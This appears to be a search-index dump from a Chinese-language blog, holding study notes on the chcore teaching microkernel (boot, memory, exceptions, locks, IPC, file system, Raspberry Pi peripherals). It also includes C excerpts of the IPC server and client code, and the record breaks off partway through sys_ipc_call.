[{"title":"chcore","url":"/2024/01/22/chcore/chcore/","content":"<h1 id=\"chcore\"><a href=\"#chcore\" class=\"headerlink\" title=\"chcore\"></a>chcore</h1><h2 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h2><ol>\n<li><p>start.S </p>\n<p><code>mpidr</code>拿到cpu核编号，其他核等待 主核设置<code>scr</code> <code>elr</code>(返回地址) <code>spsr</code>(异常状态) 切换到el1</p>\n<p>设置栈地址</p>\n</li>\n<li><p>init_c</p>\n<p>清理bss</p>\n<p>初始化uart</p>\n<p>初始化页表</p>\n<p>激活mmu</p>\n</li>\n<li><p>start_kernel</p>\n<p>重新设置栈(高地址)</p>\n<p>关掉对低地址(<code>ttbr0</code>)的翻译 flush tlb</p>\n</li>\n<li><p>main</p>\n<p>初始化锁</p>\n<p>初始化物理内存分配系统</p>\n<p><code>set_exception_vector</code> 初始化异常向量表 打开中断</p>\n<p>初始化调度策略（链表，idle线程）</p>\n<p>激活其他线程</p>\n<p>拿锁 根据指定配置创建root线程 这里<code>create_root_thread</code>会先创建root进程再创建线程</p>\n<p>调度 切换上下文 返回用户态</p>\n</li>\n</ol>\n<h2 id=\"进程与线程\"><a href=\"#进程与线程\" class=\"headerlink\" title=\"进程与线程\"></a>进程与线程</h2><p><code>cap_group</code>是进程的抽象，元数据包括其拥有的所有的内核对象，例如vmspace，Capability是访问某个内核对象的令牌</p>\n<p>进程只是获取资源和原理资源的对象，单独创建没有意义，需要填入创建线程需要的参数中然后创建线程。</p>\n<p>创建线程并加载用户文件有两个函数：</p>\n<ul>\n<li><p><code>load_binary</code> 解析elf 创建pmo，建立映射，复制数据，拿到pc并返回用于创建线程，在内核态创建root的线程的时候使用</p>\n</li>\n<li><p><code>launch_process</code>解析elf 通过系统调用创建pmo并映射 <code>spawn</code>之前的<code>parse_elf_from_binary</code>已经为每个段都拿到了pmo并复制，<code>launch_process</code>中只要为每个段建立映射即可</p>\n<p>libchore是额外提供的库，用户态程序，基本都是通过syscall和内核交互完成功能，提供<code>spawn</code>等函数</p>\n</li>\n</ul>\n<p>线程调度在内核态完成</p>\n<p>进程管理在用户态的procm server完成</p>\n<p>存在crt0的几个函数用汇编写入main外层的<code>_start</code>函数，并在main调用之后调用进程退出和线程退出函数</p>\n<p>猜测这个libchore的crt0函数会和用户程序一同编译</p>\n<h2 id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h2><p><code>0xffff_0000_0000_0000 + addr</code> 映射到 <code>addr</code></p>\n<p>树莓派规定<code>0x00000000</code>~&#96;0x3f000000&#96; 物理地址会去主存访问，再大的物理地址会去对应的外设访问，与型号有关。</p>\n<p>buddy system虽然是管理物理内存的，但是所有的操作都是针对虚拟地址的。由于之前已经进行过大块映射。所以一整块连续内存对内核来说是可以直接给buddy system使用的，把对应地址转为page*即可</p>\n<p>页表会从buddy system拿到页地址，但是存储再页表项中的地址必须转换为物理地址。</p>\n<p>pmo作为一个资源对象，记录了物理内存资源。用radix tree做索引，key是虚拟内存的page编号，value是对应的物理内存地址。</p>\n<h2 id=\"异常\"><a href=\"#异常\" class=\"headerlink\" title=\"异常\"></a>异常</h2><ol>\n<li><p><code>exception_entry</code> 保存上下文到栈中 这里使用的栈已经是内核栈了</p>\n</li>\n<li><p>进入对应的处理entry，esr寄存器可判断异常原因，传入后续c函数</p>\n</li>\n<li><p>如果是syscall，跳转到syscall_table的entry</p>\n<p>如果是其他，例如page fault，进入handle_entry.c 根据esr判断并处理</p>\n<p>如果是时钟中断，<code>sched_handle_timer_irq</code>会做和调度相关的事情</p>\n</li>\n</ol>\n<h2 id=\"锁与信号量\"><a href=\"#锁与信号量\" class=\"headerlink\" title=\"锁与信号量\"></a>锁与信号量</h2><p>chcore中存在以下不同的实现</p>\n<ol>\n<li><p>通过硬件提供的特殊load和store指令实现fetch_and_add 随后再实现ticket lock，一把大锁，一进内核就拿</p>\n</li>\n<li><p>信号量记录当前线程等待的线程信息，通过加入和移除调度队列实现 。waitpid通过信号量的wait和signal实现</p>\n</li>\n<li><p>用二元信号量可在用户态实现互斥锁</p>\n</li>\n<li><p>gcc有内置的api <code>__sync_fetch_and_add</code> <code>__sync_lock_test_and_set</code>  不需要任何头文件可以使用，用这个也能实现锁 但是这里依赖了已经存在的编译器，并不是从0写操作系统。</p>\n</li>\n</ol>\n<h2 id=\"进程间通信\"><a href=\"#进程间通信\" class=\"headerlink\" title=\"进程间通信\"></a>进程间通信</h2><h3 id=\"执行流\"><a href=\"#执行流\" class=\"headerlink\" title=\"执行流\"></a>执行流</h3><p>client先register_client，需要知道想要通信的服务端进程。</p>\n<p>创建连接会为服务端进程再创建一个线程，设置相同的vmspace (每个client都会在服务器进程创建一个线程作为单独的连接对象)</p>\n<p>client ipc_call时，不用sched，而是直接switch到target，将自己设置为waiting，不加入等待队列。需要设置参数和target为服务端的处理函数。</p>\n<p>server ipc_return时，设置client为running后直接switch到client，设置返回值</p>\n<p>由于ipc的操作都是进内核的，eret会直接返回到用户态，因此server返回到client时，执行ipc_call的下一条指令，切换到server的调用链直接被中止。由于ret addr不使用栈，因此也不会对内核栈产生很大的破坏。</p>\n<h3 id=\"共享内存\"><a href=\"#共享内存\" class=\"headerlink\" title=\"共享内存\"></a>共享内存</h3><p>每个connection会创建pmo，同时映射到client和server的地址空间</p>\n<p>client和server的thread是一对一的，但是即使是不同的thread也是服务在同一个写死的地址上，所以需要根据不同情况算偏移找不同的位置。</p>\n<ul>\n<li>server: 同一个dispatch会需要支持不同client访问，每次create_connection时会得到不同的连接，server对于IPC提供的缓冲区根据不同connection id找到偏移 服务不同客户</li>\n<li>client：同一个cilent会需要和不同的server通信，每次register client会拿到不同client id，client对于IPC提供的缓冲区根据不同的client id找到偏移，请求不同的服务</li>\n</ul>\n<p>每个client创建pmo，然后映射到服务端的地址都不会重复。buf和stack各需要一个pmo</p>\n<ul>\n<li><p><code>buf_addr</code>为A-stack client server共享内存 传递参数</p>\n</li>\n<li><p><code>stack_addr</code>为E-stack server thread执行用</p>\n</li>\n</ul>\n<h3 id=\"消息传递\"><a href=\"#消息传递\" class=\"headerlink\" title=\"消息传递\"></a>消息传递</h3><p>client通过<code>ipc_create_msg</code> 会把消息直接写入到共享内存的开头，在迁移线程时设置地址为服务端共享内存地址即可（两端虚拟地址不一样，但物理地址一样）</p>\n<p>共享内存首地址即为msg对象(元数据)，而紧接着msg对象的就是msg所带data </p>\n<p>可以自己为每种不同的IPC定义request结构体，然后直接进行类型转换</p>\n<p>以文件系统为例，共享内存布局如下</p>\n<p>msg元数据—fs_request元数据—文件数据</p>\n<h3 id=\"cap\"><a href=\"#cap\" class=\"headerlink\" title=\"cap\"></a>cap</h3><p>需要传递资源给server</p>\n<p>很多IPC的操作是被写在kernel里的，kernel的地址空间是共用的，因此即使是不同进程本地修改cap，在context switch到另一个进程时，修改仍有效</p>\n<h2 id=\"文件系统\"><a href=\"#文件系统\" class=\"headerlink\" title=\"文件系统\"></a>文件系统</h2><p>文件系统全是用户态程序</p>\n<p>File System Manager实现VFS抽象，在内存中维护一个链表，每个节点包含path和对应的文件系统server的结构体</p>\n<p>inode记录的block块号除了用连续的数组，还可用radix tree，key是page编号，value是page地址（block块号）</p>\n<h2 id=\"外设\"><a href=\"#外设\" class=\"headerlink\" title=\"外设\"></a>外设</h2><p>参考<a href=\"https://github.com/s-matyukevich/raspberry-pi-os/blob/master/docs/lesson01/rpi-os.md\">raspberry-pi-os&#x2F;rpi-os.md at master · s-matyukevich&#x2F;raspberry-pi-os · GitHub</a>及BCM2837树莓派外设手册可知，对于树莓派，硬件本身(MMU)规定了一段物理地址是专门用于访问外设的（BCM2837为0x30000000-0x3F000000）。由1.2节可知，当MMU第一次把虚拟地址翻译为物理地址后，还会通过另一个VC&#x2F;ARM MMU把物理地址翻译为总线地址。最后选择是访问主存还是外设。这里VC&#x2F;ARM MMU会把0x30000000的物理地址直接映射到0x7E000000。</p>\n<p>同时，第五章EMMC可知，EMMC寄存器基地址被规定为0x7E300000，也就是说，只要操作系统访问0x30300000的物理地址，就能做到和SD卡进行交互而非RAM。</p>\n<p>chcore先通过syscall创建pmo并映射，pmo对应的物理地址即是树莓派手册规定的用于访问外设+具体外设的地址。当访问这块物理内存时，树莓派会交由sd卡处理。同时，内存映射仍由操作系统管理，所以需要页表对应的PTE会被标记为device，使得这些页不进入缓存。</p>\n<p>进行读写等操作时，chcore会先通过mmio写一些寄存器，设置必要的参数(例如block号)，随后可以在指定内存位置进行读写(<code>EMMC_DATA</code>)。</p>\n<p>对MMIO地址使用的<code>read32</code> <code>write32</code>接口使用的地址均用<code>volatile</code>修饰，保证可以看到硬件提供的最真实的数据。</p>\n","categories":["chcore"]},{"title":"IPC","url":"/2024/01/22/chcore/IPC/","content":"<h1 id=\"IPC\"><a href=\"#IPC\" class=\"headerlink\" title=\"IPC\"></a>IPC</h1><h2 id=\"code\"><a href=\"#code\" class=\"headerlink\" title=\"code\"></a>code</h2><h3 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> cap;</span><br><span class=\"line\"></span><br><span class=\"line\">        cap = chcore_thread_create(routine, <span class=\"number\">0</span>, <span class=\"number\">0</span>, TYPE_USER);</span><br><span class=\"line\">        chcore_bug_on(cap &lt; <span class=\"number\">0</span>);</span><br><span class=\"line\">        __chcore_set_procm_cap(cap);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> *<span class=\"title function_\">routine</span><span class=\"params\">(<span class=\"type\">void</span> *arg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret, cap;</span><br><span class=\"line\"></span><br><span class=\"line\">        spawn(<span class=\"string\">&quot;/user.bin&quot;</span>, &amp;cap); <span class=\"comment\">/* Test spawn function */</span></span><br><span class=\"line\">        ipc_register_server(lab4_test_ipc_dispatch);</span><br><span class=\"line\">        spawn(<span class=\"string\">&quot;/ipc_client.bin&quot;</span>, &amp;cap); <span class=\"comment\">/* Test IPC */</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">ipc_register_server</span><span class=\"params\">(server_handler server_handler)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> <span class=\"title\">vm_config</span>;</span></span><br><span class=\"line\">        vm_config.buf_base_addr = SERVER_BUF_BASE;</span><br><span class=\"line\">        vm_config.buf_size = SERVER_BUF_SIZE;</span><br><span class=\"line\">        vm_config.stack_base_addr = SERVER_STACK_BASE;</span><br><span class=\"line\">        vm_config.stack_size = SERVER_STACK_SIZE;</span><br><span class=\"line\">        ret = __chcore_sys_register_server(</span><br><span class=\"line\">                (u64)server_handler, MAX_CLIENT, (u64)&amp;vm_config);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 <span class=\"title function_\">sys_register_server</span><span class=\"params\">(u64 callback, u64 max_client, u64 vm_config_ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">server</span> =</span> current_thread;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">server_ipc_config</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> *<span class=\"title\">vm_config</span>;</span></span><br><span class=\"line\">        <span class=\"type\">int</span> r;</span><br><span class=\"line\">        server_ipc_config = kmalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> server_ipc_config));</span><br><span class=\"line\">        server_ipc_config-&gt;callback = callback;</span><br><span class=\"line\">        server_ipc_config-&gt;max_client = max_client;</span><br><span class=\"line\">        server_ipc_config-&gt;conn_bmp =</span><br><span class=\"line\">                kzalloc(BITS_TO_LONGS(max_client) * <span class=\"keyword\">sizeof</span>(<span class=\"type\">long</span>));</span><br><span class=\"line\">        vm_config = &amp;server_ipc_config-&gt;vm_config;</span><br><span class=\"line\">        r = copy_from_user(</span><br><span class=\"line\">                (<span class=\"type\">char</span> *)vm_config, (<span class=\"type\">char</span> *)vm_config_ptr, <span class=\"keyword\">sizeof</span>(*vm_config));</span><br><span class=\"line\">        server-&gt;general_ipc_config = server_ipc_config;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">lab4_test_ipc_dispatch</span><span class=\"params\">(<span class=\"keyword\">struct</span> ipc_msg *ipc_msg, u64 client_pid)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret_cap, write_val;</span><br><span class=\"line\">        <span class=\"type\">bool</span> ret_with_cap = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> len = ipc_msg-&gt;data_len;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((i * <span class=\"number\">4</span>) &lt; len) &#123;</span><br><span class=\"line\">            ret += ((<span class=\"type\">int</span> *)ipc_get_msg_data(ipc_msg))[i];</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ret_with_cap)</span><br><span class=\"line\">                ipc_return_with_cap(ipc_msg, ret);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">                ipc_return(ipc_msg, ret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">sys_ipc_return</span><span class=\"params\">(u64 ret, u64 cap_num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_connection</span> *<span class=\"title\">conn</span> =</span> current_thread-&gt;active_conn;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cap_num != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                ipc_send_cap_to_client(conn, cap_num);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        conn-&gt;source-&gt;thread_ctx-&gt;state = TS_RUNNING;</span><br><span class=\"line\">        conn-&gt;source-&gt;thread_ctx-&gt;sc = current_thread-&gt;thread_ctx-&gt;sc;</span><br><span class=\"line\">        thread_migrate_to_client(conn, ret);</span><br><span class=\"line\">     \tBUG(<span class=\"string\">&quot;This function should never\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">thread_migrate_to_client</span><span class=\"params\">(<span class=\"keyword\">struct</span> ipc_connection *conn, u64 ret_value)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">source</span> =</span> conn-&gt;source;</span><br><span class=\"line\">        current_thread-&gt;active_conn = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        arch_set_thread_return(source, ret_value);</span><br><span class=\"line\">        switch_to_thread(source);</span><br><span class=\"line\">        eret_to_thread(switch_context());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"client\"><a href=\"#client\" class=\"headerlink\" title=\"client\"></a>client</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[], <span class=\"type\">char</span> *envp[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        test_ipc_routine(__chcore_get_procm_cap());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">test_ipc_routine</span><span class=\"params\">(<span class=\"type\">int</span> server_cap)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_struct</span> *<span class=\"title\">client_ipc_struct</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_msg</span> *<span class=\"title\">ipc_msg</span>;</span></span><br><span class=\"line\">        <span class=\"type\">int</span> shared_page_pmo_cap, shared_msg;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret, i;</span><br><span class=\"line\">        client_ipc_struct = ipc_register_client(server_cap);</span><br><span class=\"line\"></span><br><span class=\"line\">       ipc_msg = ipc_create_msg(client_ipc_struct, <span class=\"number\">4</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; IPC_TEST_NUM; i++) &#123;</span><br><span class=\"line\">                ipc_set_msg_data(ipc_msg, (<span class=\"type\">char</span> *)&amp;i, <span class=\"number\">0</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">                ret = ipc_call(client_ipc_struct, ipc_msg);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> ipc_struct *<span class=\"title function_\">ipc_register_client</span><span class=\"params\">(<span class=\"type\">int</span> server_thread_cap)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> conn_cap, retry_times = RETRY_UPPER_BOUND;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_struct</span> *<span class=\"title\">ipc_struct</span> =</span> <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> ipc_struct));</span><br><span class=\"line\">        <span class=\"type\">int</span> client_id = __sync_fetch_and_add(&amp;client_ipc_num, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> <span class=\"title\">vm_config</span>;</span></span><br><span class=\"line\">        vm_config.buf_base_addr = CLIENT_BUF_BASE + client_id * CLIENT_BUF_SIZE;</span><br><span class=\"line\">        vm_config.buf_size = CLIENT_BUF_SIZE;</span><br><span class=\"line\">        conn_cap = __chcore_sys_register_client((u32)server_thread_cap,(u64)&amp;vm_config);</span><br><span class=\"line\">        ipc_struct-&gt;shared_buf = vm_config.buf_base_addr;</span><br><span class=\"line\">        ipc_struct-&gt;shared_buf_len = vm_config.buf_size;</span><br><span class=\"line\">        ipc_struct-&gt;conn_cap = conn_cap;</span><br><span class=\"line\">        spinlock_init(&amp;ipc_struct-&gt;ipc_lock);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ipc_struct;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u32 <span class=\"title function_\">sys_register_client</span><span class=\"params\">(u32 server_cap, u64 vm_config_ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">client</span> =</span> current_thread;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">server</span> =</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_connection</span> *<span class=\"title\">conn</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> <span class=\"title\">vm_config</span> =</span> &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">        u64 client_buf_size;</span><br><span class=\"line\">        <span class=\"type\">int</span> conn_cap = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> r = <span class=\"number\">0</span>;</span><br><span class=\"line\">        r = copy_from_user(</span><br><span class=\"line\">                (<span class=\"type\">char</span> *)&amp;vm_config, (<span class=\"type\">char</span> *)vm_config_ptr, <span class=\"keyword\">sizeof</span>(vm_config));</span><br><span class=\"line\">        server = obj_get(current_cap_group, server_cap, TYPE_THREAD);</span><br><span class=\"line\">        client_buf_size = vm_config.buf_size;</span><br><span class=\"line\">        conn_cap = create_connection(client, server, &amp;vm_config);</span><br><span class=\"line\">        conn = obj_get(current_cap_group, conn_cap, TYPE_CONNECTION);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (client_buf_size != vm_config.buf_size) &#123;</span><br><span class=\"line\">                r = copy_to_user((<span class=\"type\">char</span> *)vm_config_ptr,</span><br><span class=\"line\">                                 (<span class=\"type\">char</span> *)&amp;vm_config,</span><br><span class=\"line\">                                 <span class=\"keyword\">sizeof</span>(vm_config));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        r = conn_cap;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">create_connection</span><span class=\"params\">(<span class=\"keyword\">struct</span> thread *source, <span class=\"keyword\">struct</span> thread *target,</span></span><br><span class=\"line\"><span class=\"params\">                             <span class=\"keyword\">struct</span> ipc_vm_config *client_vm_config)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_connection</span> *<span class=\"title\">conn</span> =</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> conn_cap = <span class=\"number\">0</span>, server_conn_cap = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pmobject</span> *<span class=\"title\">stack_pmo</span>, *<span class=\"title\">buf_pmo</span>;</span></span><br><span class=\"line\">        <span class=\"type\">int</span> conn_idx;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">server_ipc_config</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_vm_config</span> *<span class=\"title\">vm_config</span>;</span></span><br><span class=\"line\">        u64 server_stack_base, server_buf_base, client_buf_base;</span><br><span class=\"line\">        u64 stack_size, buf_size;</span><br><span class=\"line\">        conn = obj_alloc(TYPE_CONNECTION, <span class=\"keyword\">sizeof</span>(*conn));</span><br><span class=\"line\">        conn-&gt;target = create_server_thread(target);</span><br><span class=\"line\">        server_ipc_config = target-&gt;general_ipc_config;</span><br><span class=\"line\">        vm_config = &amp;server_ipc_config-&gt;vm_config;</span><br><span class=\"line\">        conn_idx = find_next_zero_bit(</span><br><span class=\"line\">                server_ipc_config-&gt;conn_bmp, server_ipc_config-&gt;max_client, <span class=\"number\">0</span>);</span><br><span class=\"line\">        set_bit(conn_idx, server_ipc_config-&gt;conn_bmp);</span><br><span class=\"line\">        server_stack_base = vm_config-&gt;stack_base_addr + conn_idx * vm_config-&gt;stack_size;</span><br><span class=\"line\"></span><br><span class=\"line\">        stack_size = vm_config-&gt;stack_size;</span><br><span class=\"line\">        stack_pmo = kmalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pmobject));</span><br><span class=\"line\">        pmo_init(stack_pmo, PMO_DATA, stack_size, <span class=\"number\">0</span>);</span><br><span class=\"line\">        vmspace_map_range(target-&gt;vmspace,</span><br><span class=\"line\">                          server_stack_base,</span><br><span class=\"line\">                          stack_size,</span><br><span class=\"line\">                          VMR_READ | VMR_WRITE,</span><br><span class=\"line\">                          stack_pmo);</span><br><span class=\"line\">        conn-&gt;server_stack_top = server_stack_base + stack_size;</span><br><span class=\"line\">        server_buf_base = vm_config-&gt;buf_base_addr + conn_idx * vm_config-&gt;buf_size;</span><br><span class=\"line\">        client_buf_base = client_vm_config-&gt;buf_base_addr;</span><br><span class=\"line\">        buf_size = MIN(vm_config-&gt;buf_size, client_vm_config-&gt;buf_size);</span><br><span class=\"line\">        client_vm_config-&gt;buf_size = buf_size;</span><br><span class=\"line\">        buf_pmo = kmalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pmobject));</span><br><span class=\"line\">        pmo_init(buf_pmo, PMO_DATA, buf_size, <span class=\"number\">0</span>);</span><br><span class=\"line\">        vmspace_map_range(current_thread-&gt;vmspace, client_buf_base, buf_size, VMR_READ | VMR_WRITE, buf_pmo);</span><br><span class=\"line\">        vmspace_map_range(target-&gt;vmspace, server_buf_base, buf_size, VMR_READ | VMR_WRITE, buf_pmo);</span><br><span class=\"line\">        conn-&gt;buf.client_user_addr = client_buf_base;</span><br><span class=\"line\">        conn-&gt;buf.server_user_addr = server_buf_base;</span><br><span class=\"line\">        conn_cap = cap_alloc(current_cap_group, conn, <span class=\"number\">0</span>);</span><br><span class=\"line\">        server_conn_cap =</span><br><span class=\"line\">                cap_copy(current_cap_group, target-&gt;cap_group, conn_cap);</span><br><span class=\"line\">        conn-&gt;server_conn_cap = server_conn_cap;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> conn_cap;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> thread *<span class=\"title function_\">create_server_thread</span><span class=\"params\">(<span class=\"keyword\">struct</span> thread *src)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">thread</span> *<span class=\"title\">new</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">new_config</span>;</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">server_ipc_config</span> *<span class=\"title\">src_config</span>;</span></span><br><span class=\"line\">        new = kmalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> thread));</span><br><span class=\"line\">        new-&gt;vmspace = obj_get(src-&gt;cap_group, VMSPACE_OBJ_ID, TYPE_VMSPACE);</span><br><span class=\"line\">        new-&gt;thread_ctx = create_thread_ctx(TYPE_SHADOW);</span><br><span class=\"line\">        <span class=\"built_in\">memcpy</span>((<span class=\"type\">char</span> *)&amp;(new-&gt;thread_ctx-&gt;ec),</span><br><span class=\"line\">               (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;(src-&gt;thread_ctx-&gt;ec),</span><br><span class=\"line\">               <span class=\"keyword\">sizeof</span>(<span class=\"type\">arch_exec_cont_t</span>));</span><br><span class=\"line\">        new-&gt;thread_ctx-&gt;prio = MAX_PRIO - <span class=\"number\">1</span>;</span><br><span class=\"line\">        new-&gt;thread_ctx-&gt;state = TS_INIT;</span><br><span class=\"line\">        new-&gt;thread_ctx-&gt;affinity = NO_AFF;</span><br><span class=\"line\">        new-&gt;thread_ctx-&gt;type = TYPE_SHADOW;</span><br><span class=\"line\">        src_config = (<span class=\"keyword\">struct</span> server_ipc_config *)src-&gt;general_ipc_config;</span><br><span class=\"line\">        new_config = kzalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> server_ipc_config));</span><br><span class=\"line\">        new_config-&gt;callback = src_config-&gt;callback;</span><br><span class=\"line\">        new_config-&gt;vm_config = src_config-&gt;vm_config;</span><br><span class=\"line\">        new-&gt;general_ipc_config = new_config;</span><br><span class=\"line\">        new-&gt;cap_group = src-&gt;cap_group;</span><br><span class=\"line\">        obj_put(new-&gt;vmspace);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> new;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 <span class=\"title function_\">sys_ipc_call</span><span class=\"params\">(u32 conn_cap, <span class=\"keyword\">struct</span> ipc_msg *ipc_msg, u64 cap_num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ipc_connection</span> *<span class=\"title\">conn</span> =</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        u64 arg;</span><br><span class=\"line\">        <span class=\"type\">int</span> r = <span class=\"number\">0</span>;</span><br><span class=\"line\">        conn = obj_get(current_thread-&gt;cap_group, conn_cap, TYPE_CONNECTION);</span><br><span class=\"line\">        conn-&gt;ipc_msg = ipc_msg;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cap_num &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                r = 